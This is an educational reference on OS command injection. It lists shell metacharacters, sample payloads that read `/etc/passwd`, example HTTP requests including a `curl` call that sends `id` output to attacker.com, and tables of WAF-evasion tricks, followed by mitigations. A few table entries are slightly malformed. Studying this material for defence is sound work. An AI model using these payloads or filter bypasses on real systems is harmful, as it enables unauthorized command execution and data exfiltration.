# Attack Classes - CMDI

Command injection is an attack where the goal is to execute arbitrary commands on the host operating system via a vulnerable application.
A web application is vulnerable to command injection if it passes unsanitized user input directly to the operating system shell.

These user-supplied inputs can be:

- Forms
- Cookies
- HTTP headers
- URL parameters
- File uploads
- etc.

This attack is different from code injection, which allows the attacker to add their own code that is then executed by the application. In command injection the attacker extends the default functionality of the application, which then executes system commands without having to inject code.

## Characterisitics

These are the common characteristics that define a command injection attack.

- User-supplied data passed directly to an OS shell
- Uses special characters to break out of the intended command
- Can lead to remote code execution (RCE)
- Platform-specific syntax (Linux vs. Windows)
- Exploits trust in application-level validation
- Often requires URL encoding or obscure characters to bypass filters

### Common Special Characters

These are the most common special characters used in command injection attacks:

- `;` - command separator
- `|` - pipe
- `&` - ampersand
- `&&` - conditional AND
- `||` - conditional OR
- `` ` `` - backtick (command substitution)
- `$()` - command substitution
- `\n` - newline
- `%0a` - URL-encoded newline
- `%00` - null byte

### Common Payloads

Here are some common command injection payloads:

**Linux:**

```
id
cat /etc/passwd
ls -la
echo 1 | cat /etc/passwd
```

**Windows:**

```
whoami
ver
dir
echo 1 | dir
```

**Cross-platform:**

```
id;whoami
cat /etc/passwd;id
echo 1 | cat /etc/passwd;id
```

### Payload Examples

[BENIGN]
GET /api/report?filename=Q1_report.pdf HTTP/1.1
Host: target.example.com

[MALICIOUS] *Semicolon Chaining*
GET /api/report?filename=Q1_report.pdf;whoami HTTP/1.1
Host: target.example.com

[MALICIOUS] *URL-encoded Newline Injection*
GET /api/report?filename=Q1_report.pdf%0Awhoami HTTP/1.1
Host: target.example.com

[MALICIOUS] *Pipe Chaining*
GET /api/report?filename=Q1_report.pdf|whoami HTTP/1.1
Host: target.example.com

[MALICIOUS] *Command Substitution with Exfiltration*
GET /api/report?filename=$(curl+http://attacker.com/$(id)) HTTP/1.1
Host: target.example.com

### Obfuscation Techniques

- Encoding Evasion: Web servers automatically decode URL parameters before processing them. If a signature look-up blocks a raw semicolon, passing %3b allows the payload to transit the WAF cleanly. The backend web server decodes %3b back into ; right before passing the string to an unsafe execution function like PHP's system() or Node's child_process.exec()

| Special character | URL-encoded form | Purpose | Bypassed By |
|-------------------|------------------|---------|-------------|
| `;` (Semicolon) | `%3b` | Sequential command execution | `cat%3bwhoami` |
| (Pipe) | `%7c` | Inter-process data redirection | `cat%7cwhoami` |
| `\n` (Newline) | `%0a` | Logical separator operating like a semicolon | `cat%0awhoami` |
| `&` (Ampersand) | `%26` | Conditional execution | `cat%26whoami` |
| `` ` `` (Backtick) | `%60` | Command substitution | `` `whoami` `` |

| Encoding Level | Encoded Value | Decoded Value | bypasses | notes |
|----------------|---------------|---------------|----------|-------|
| URL (single) | %3B %7C %0a | ; | yes | standard evasion |
| Double | %253B %257C %250A | ; | yes | evades WAF decoders |
| URL + Bash variable | %3B%20cat${IFS}/etc/passwd | ; cat /etc/passwd | yes | evades whitespace rules |
| Mixed encoding | %3B%257C%0A | ; | yes | evades WAF logic |

- Whitespace Substitution: In Bash and sh, $IFS is an environmental variable defining the exact characters used as field boundaries. By default, its value contains a space, a tab, and a newline ( \t\n).

| Whitespace character | Bash syntax | Purpose | Bypass WAF? |
|----------------------|-------------|---------|-------------|
| Tab | \t or $' ' | Standard delimiter | Yes |
| Newline | \n or $'\n' | Breaks command | Yes |
| Bash-specific control character | ${IFS} | Uses built-in separator | Yes |
| Bash-specific control character | \x09, \x0a | Hexadecimal encoding | Yes |
| Backtick-escaped | \`\` | Evades literal whitespace match | Yes |

- Command Substitution Chaining: Command substitution runs a subshell command and swaps the standard output directly into the host string. Attackers chain these forms to break regular expression patterns that are looking for single-layered, linear command strings.

| Substitution form | Syntax | Behavior | Bypasses regex |
|--------------------|--------|----------|----------------|
| Backtick | \`cmd\` | Executes command; output replaces backticks | Yes |
| $() | \$(cmd) | Executes command; output replaces $() | Yes |
| Nested | \`\`cmd\`\` | Nested execution | Yes |
| Mixed nesting | \`$(cmd)\' | Alternates syntax | Yes |

## Mitigations

- Input Validation: Use an allow list instead of a block list. Instead of trying to remove known bad characters, define exactly what input is valid and reject anything that falls outside of that.

- Parameterized Queries: Write code that separates user-supplied input from OS-level system calls. Use language-specific APIs that are designed to handle external data safely.

- Least Privilege: Run all application services with the minimum level of permissions necessary to perform their function. This ensures that even if a command injection attack is successful, the potential damage is contained.

- Avoid OS Command Execution: Try to avoid using OS command execution functions in your code. If you must use them, use them with extreme caution.

**References:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html) · [OWASP A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
